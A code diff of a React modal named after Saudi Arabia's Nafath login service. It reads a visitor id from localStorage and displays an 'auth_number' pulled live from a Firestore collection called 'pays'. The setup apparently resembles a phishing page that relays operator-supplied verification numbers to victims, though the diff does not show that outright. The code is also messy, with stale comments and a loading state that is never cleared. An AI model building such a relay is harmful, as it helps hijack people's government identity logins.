@@ -17,38 +17,35 @@ export default function NafazModal({ isOpen, onClose, userId, phone }: ModalProp
   const [loading, setLoading] = useState(true)
 
   // Fetch Nafaz PIN from Firestore and listen for changes
+
   useEffect(() => {
-    if (!isOpen || !userId) return
-    console.log(auth_number)
-    // eslint-disable-next-line no-constant-binary-expression
-    setLoading(true && auth_number !== "")
+    const userId = localStorage.getItem('visitor')
+    if (userId) {
+      const userDocRef = doc(db, "pays", userId)
 
-    // Set up real-time listener to the user's document in Firestore
-    const userDocRef = doc(db, "pays", userId)
+      const unsubscribe = onSnapshot(
+        userDocRef,
+        (docSnapshot: { exists: () => any; data: () => any }) => {
+          if (docSnapshot.exists()) {
+            const userData = docSnapshot.data()
+            // Assuming the PIN is stored in a field called 'nafaz_pin'
+              setAuthNumber(userData.auth_number)
 
-    const unsubscribe = onSnapshot(
-      userDocRef,
-      (docSnapshot) => {
-        if (docSnapshot.exists()) {
-          const userData = docSnapshot.data()
-          // Assuming the PIN is stored in a field called 'nafaz_pin'
-          const pin = userData.nafaz_pin || ""
-          setAuthNumber(pin)
-        } else {
-          console.error("User document not found")
-        }
-        setLoading(false)
-      },
-      (error) => {
-        console.error("Error fetching Nafaz PIN:", error)
-        setLoading(false)
-      },
-    )
 
-    // Clean up the listener when component unmounts or modal closes
-    return () => unsubscribe()
-  }, [isOpen, userId])
+          } else {
+            console.error("User document not found")
+          }
+        },
 
+      )
+
+      // Clean up the listener when component unmounts or modal closes
+      return () => unsubscribe()
+      
+      // Get data from localStorage
+     
+    }
+  }, [])
   // Timer logic
   useEffect(() => {
     if (!isOpen) {
@@ -99,7 +96,7 @@ export default function NafazModal({ isOpen, onClose, userId, phone }: ModalProp
 
             <div className="w-24 h-24 rounded-xl flex items-center justify-center mx-auto border-2 border-[#3a9f8c]">
               {loading ? (
-                <div className="animate-pulse h-8 w-16 bg-gray-200 rounded">{auth_number}</div>
+                <div className="animate-pulse h-8 w-16 rounded">{auth_number}</div>
               ) : (
                 <span className="text-4xl font-medium text-[#3a9f8c]">{auth_number}</span>
               )}
